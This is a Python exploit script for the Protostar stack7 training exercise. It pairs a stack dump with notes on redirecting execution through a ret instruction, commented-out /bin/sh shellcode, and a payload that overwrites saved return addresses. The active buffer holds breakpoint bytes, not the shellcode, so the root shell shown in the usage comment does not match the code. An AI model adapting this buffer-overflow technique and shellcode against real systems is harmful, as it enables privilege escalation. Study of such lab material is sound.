# Author	 : Abhinav Thakur
# E-Mail	 : compilepeace@gmail.com
# Platform	 : exploit-exercises/protostar/stack7
# ScriptName : exploit_stack7.py
#
# Usage 	 : While in protostar VM /home/ directory, type the bellow commands
#			   		$ python exploit_stack7.py > input_file
#			   		$ cat input_file - | /opt/protostar/bin/stack7
#					whoami
#					root
#


# In getpath() : buffer is at 0xbffff75c
#                ebp is at 0xbffff7a8
#                return pointer is at 0xbffff7ac

# In main()    : ebp is at 0xbffff7b8
#                return pointer is at 0xbffff7bc

# Stack layout is shown bellow with 0x41('A') as our buffer input -

#0xbffff750:     0x00000000      0x00000001      0xb7fff8f8      0x41414141
#0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff790:     0x41414141      0x41414141      0x41414141      0x08048550
#0xbffff7a0:     0xb7ec6365      0xb7ff1040      0xbffff7b8      0x08048550
#0xbffff7b0:     0x08048570      0x00000000      0xbffff838      0xb7eadc76
#0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848


# since we cannot modify getpath()'s return address to anything starting with
# '0xb', what I can think of doing is one of the 2 -
#       > Overwrite main()'s return pointer (saved eip) and let the flow of
#		  execution to reach main's ret instruction which will lead to 
#		  execution of arbitary code on the overwritten address where 
#   	  shellcode will be placed.
#		> Overwrite  the getpath()'s return pointer to point to the ret 
#		  instruction of either main() or getpath(), both of which would lead
#		  to poping of a DWORD (4 bytes) from the stack	(esp) (which is just
#		  next to getpath()'s saved eip) in which I overwrote an address 
# 		  pointing to the shellcode. ('incomplete exploit'). 
#       > Overwrite the getpath()'s return pointer to return to libc


import struct

# This time placing our shellcode (28 bytes) in buffer itself with some NOPS
#buffer = "\x90"*36 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

buffer = "\x90"*60 + "\xcc"*4

padding = "B"*16
getpath_ret_ptr = struct.pack("I", 0x08048553)
pop_ret_addr = struct.pack("I", 0xbffff770)             # After the ret_pointer is overwritten with address of another return address (of main()(could also have given the return address of getpath() itself), 4 bytes are poped off the stack and copied to eip for execution, those 4 bytes are now the address of some place in buffer.

payload = buffer + padding + getpath_ret_ptr + pop_ret_addr

print payload

